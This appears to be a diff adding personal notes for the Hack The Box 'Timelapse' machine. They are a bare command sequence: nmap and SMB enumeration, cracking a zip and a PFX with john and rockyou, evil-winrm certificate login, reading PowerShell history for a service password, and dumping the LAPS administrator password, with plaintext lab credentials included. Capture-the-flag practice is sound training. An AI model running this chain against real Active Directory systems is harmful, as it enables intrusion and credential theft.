@@ -1,0 +1,109 @@
+
+TimeLaspse
+
+https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html
+ 
+nmap -p- --min-rate 10000 10.10.11.152
+nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,62656 -sCV 10.10.11.152
+nmap -sC -sV -A 10.10.11.152 -Pn
+nmap -p- -T4 10.10.11.152 -Pn
+nmap -p 1-500 -sU -T4 10.10.11.152 -Pn
+nmap -sC -sV -p- 10.10.11.152  
+
+
+ldapsearch -h 10.10.11.152 -x -s base namingcontexts
+
+
+/etc/hosts
+10.10.11.152 timelapse.htb dc01.timelapse.htb
+
+crackmapexec smb dc01.timelapse.htb
+crackmapexec smb dc01.timelapse.htb
+
+smbmap -H 10.10.11.152 -u anonymous
+
+smbclient -L //dc01.timelapse.htb -N
+smbclient -L //10.10.11.152/ -N
+smbclient \\\\10.10.11.152\\Shares
+
+crackmapexec smb dc01.timelapse.htb --shares -u USERNAME -p ''
+
+smbmap -H 10.10.11.152 -u "" -p ""
+smbclient //10.10.11.152/Shares/
+
+smbclient -N //dc01.timelapse.htb/Shares
+>cd dev
+>smb: \dev\> get winrm_backup.zip
+smb: \helpdesk\> ls
+
+$ sudo apt-get install cifs 
+$ sudo mount -t cifs //<ip>/<share> /mnt/<dir>
+ls /mnt/Shares/Helpdesk
+
+fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
+
+
+unzip -l winrm_backup.zip
+unzip winrm_backup.zip 
+file legacyy_dev_auth.pfx
+
+
+zip2john winrm_backup.zip
+zip2john winrm_backup.zip > winrm_backup.zip.hash
+john  --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash 
+unzip -P supremelegacy winrm_backup.zip 
+
+
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
+
+
+pfx2john legacyy_dev_auth.pfx
+pfx2john legacyy_dev_auth.pfx >pfx_timelapse.hash
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./legacyy_dev_auth.pfx
+
+
+
+pfx2john.py legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash
+john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash --rule /usr/share/john/rules/rockyou-30000.rule
+
+
+
+
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
+openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+ls legacyy_dev_auth.*
+
+evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
+evil-winrm -i 10.10.11.152 -c public.pem -k private.pem -S -r timelapse
+evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S -r timelapse -s /home/kali
+
+
+
+*Evil-WinRM* PS C:\Users\legacyy\desktop> type user.txt ; whoami /user ; whoami /priv
+
+*Evil-WinRM* PS C:\Users\legacyy> net user legacyy
+*Evil-WinRM* PS C:\Users\legacyy> net user legacyy
+
+*Evil-WinRM* PS C:\Users> echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords.ps1
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords
+
+
+evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
